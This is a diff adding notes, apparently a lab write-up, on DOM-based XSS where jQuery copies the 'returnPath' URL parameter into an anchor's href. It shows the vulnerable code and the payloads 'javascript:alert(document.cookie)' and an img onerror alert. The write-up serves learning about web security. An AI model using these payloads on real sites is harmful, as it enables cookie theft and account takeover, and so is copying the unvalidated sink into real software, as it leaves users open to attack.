@@ -82,3 +82,42 @@ The DOM modified is the following:
     <img src="0" onerror="alert()">
 </span>
 ```
+
+# DOM XSS in JQuery anchor href attribute sink using location.search source
+
+### Scenario
+JQuery is a JS framework with a little bit different syntax from vanilla JS.
+
+```html
+<a id="backLink" href="/">Back</a>
+```
+
+This back link on the page, redirect the users to the previous page.
+
+The href is populated by a JQuery script.
+
+```javascript
+$(function() {
+    $('#backLink').attr("href", (new URLSearchParams(window.location.search)).get('returnPath'));
+});
+```
+
+- $('#backLink') this select the element with the id="backLink";
+- attr("href") go inside the attribute href in the selected ID;
+- Assign to this attribute the value retrieved from the URL parameter called "returnPath".
+
+### Exploit
+If we have an anchor tag (<a>) and inside the href parameter of it we have "javascript:SOMEJS", SOMEJS will be executed directly.
+
+
+We can assign to the returnPath URL parameter something like this:
+```
+javascript:alert(document.cookie)
+```
+
+Resulting DOM:
+```html
+<a id="backLink" href="javascript:alert(document.cookie)">Back</a>
+```
+
+When we will click on the link on the web page, the JS will be executed. We will get an alert with the cookie shown inside.
